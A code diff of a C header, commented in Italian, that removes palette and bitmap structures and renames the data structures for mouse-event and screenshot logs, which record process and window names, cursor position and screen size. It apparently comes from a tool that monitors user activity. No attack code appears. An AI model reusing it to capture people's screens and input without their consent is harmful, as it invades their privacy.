@@ -1,29 +1,6 @@
-#define BUILD_PALETTE(x) { DWORD i, j = 0; for(i=0; i<256; i++) { \
-		                    x[i].peRed = colors[j++]; \
-						    x[i].peGreen = colors[j++]; \
-		                    x[i].peBlue = colors[j++]; \
-							x[i].peFlags = 0; }}
-
-typedef struct {
-	BYTE peBlue;
-    BYTE peGreen;
-	BYTE peRed;
-	BYTE peFlags;
-} QUADPALETTE;
-
-typedef struct {
-    BITMAPINFOHEADER   bmiHeader;
-    QUADPALETTE        bmiColors[256];
-} BITMAPINFOFULL;
-
-typedef struct {
-    WORD         palVersion;
-    WORD         palNumEntries;
-    PALETTEENTRY palPalEntry[256];
-} LOGPALETTEFULL;
 
 // XXX Additional data per i log di tipo mouse
-typedef struct _MouseAdditionalData {
+typedef struct _mouse_data {
 	UINT uVersion;
 		#define LOG_MOUSE_VERSION 2009040201
 	UINT uProcessNameLen;
@@ -32,15 +9,15 @@ typedef struct _MouseAdditionalData {
 	UINT yPos;
 	UINT max_x;
 	UINT max_y;
-} MouseAdditionalData;
+} MOUSE_DATA;
 
 // XXX Additional data per i log di tipo snapshot
-typedef struct _SnapshotAdditionalData {
+typedef struct _snapshot_data {
 	UINT uVersion;
 		#define LOG_SNAP_VERSION 2009031201
 	UINT uProcessNameLen;
 	UINT uWindowNameLen;
-} SnapshotAdditionalData;
+} SNASHOT_DATA;
 
 // Dichiarata in HM_SnapShot.h in cui questo file viene incluso
 extern void TakeSnapShot(HWND grabwind, BOOL only_window, DWORD quality);
